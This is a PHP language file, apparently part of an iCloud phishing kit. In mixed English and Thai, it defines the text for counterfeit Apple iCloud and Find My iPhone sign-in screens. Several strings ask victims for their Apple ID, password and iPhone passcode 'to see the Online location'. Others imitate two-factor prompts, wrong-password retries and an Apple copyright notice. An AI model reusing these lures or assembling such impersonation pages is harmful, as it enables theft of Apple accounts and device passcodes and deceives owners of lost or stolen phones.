<?php
$lang = array();
$lang["PAGE_TITLE"] = "iCloud";
$lang["SETUP_INSTRUCTIONS"] = "Setup Instructions";
$lang["MOB_locating"] = "Locating...";
$lang["HELP"] = "Help";
$lang["ALERT1"] = "Authentication Required";
$lang["ALERT2"] = "Enter your Apple ID & password";
$lang["ALERT3"] = "to see the Online location.";
$lang["ALERT4"] = "Your Apple ID or password was incorrect.";
$lang["VERIFY"] = "Verify your identity.";
$lang["PROTECTED"] = "Your Apple ID is protected with two-factor authentication.";
$lang["CODESHOWN"] = " Enter the Passcode of your iPhone or verification code shown on your other devices.";
$lang["VERIFYING"] = "Verifying...";
$lang["SIGN_IN_TITLE"] = "ลงชื่อเข้า iCloud";
$lang["INCORRECT_ID"] = "Your Apple ID or password was incorrect.";
$lang["APPLE_ID"] = "Apple ID";
$lang["PASSWORD"] = "Password";
$lang["KEEP_ME"] = "ให้ฉันอยู่ในระบบเสมอ";
$lang["FORGOT_ID"] = "ลืม Apple ID หรือรหัสผ่านหรือไม่ ?";
$lang["DONT_HAVE_ID"] = "Don’t have an Apple ID?";
$lang["CREATE_YOURS"] = "Create yours now.";
$lang["Create_Footer"] = "สร้าง Apple ID";
$lang["CHECK_ACTIVATION"] = "Check Activation Lock Status";
$lang["SYSTEM_STATUS"] = "System Status";
$lang["POLICY"] = "สถานะระบบ";
$lang["TERMS"] = "ข้อกำหนดและเงื่อนไข";
$lang["COPYRIGHT"] = "Copyright © 2020 Apple Inc. สงวนสิทธ์ทั่งหมด.";
$lang["MOB_PAGE_TITLE"] = "iCloud";
$lang["MOB_FIND"] = "Find My iPhone";
$lang["MOB_APPLE_ID"] = "Apple ID";
$lang["MOB_EXAMPLE"] = "example@icloud.com";
$lang["MOB_PASSWORD"] = "Password";
$lang["MOB_REQUIRED"] = "Required";
$lang["MOB_LOGIN"] = "Sign in...";
$lang["MOB_FORGOT_ID"] = "Forgot Apple ID or Password ?";
$lang["MOB_SETUP_INSTRUCTIONS"] = "Setup Instructions";
$lang["MOB_locating"] = "Locating...";
$lang["IDPWD_ERROR_ALERT1"] = "Verification Failed";
$lang["IDPWD_ERROR_ALERT2"] = "Your Apple ID or password was incorrect.";
$lang["REMINDERS"] = "Reminders";
$lang["NOTES"] = "Notes";
$lang["ICLOUD_DRIVE"] = "iCloud Drive";
$lang["PHOTOS"] = "Photos";
$lang["CONTACTS"] = "Contacts";
$lang["MAIL"] = "Mail";
$lang["SETTINGS"] = "Settings";
$lang["FIND_MY_IPHONE"] = "Find My iPhone";
$lang["KEYNOTE"] = "Keynote";
$lang["NUMBERS"] = "Numbers";
$lang["FIND_FRIENDS"] = "Find Friends";
$lang["PAGES"] = "Pages";
$lang["ALL_DEVICES"] = "All Devices";
$lang["ICLOUD_SETTINGS"] = "icloud Settings";
$lang["SIGN_OUT"] = "Sign Out";
$lang["LOCATE"] = "Locating...";
$lang["WELCOME"] = "Welcome to";
$lang["IMPROVE"] = "Improve the chance of finding your iPhones even when they are not connected to internet.";
$lang["MOMENT"] = "It may take few minutes to locate your lost iPhone.";
$lang["ALL_DEVICES_OFFLINE"] = "All Devices Offline";
$lang["NO_LOCO"] = "No locations can be shown because all your devices are offline.";




?>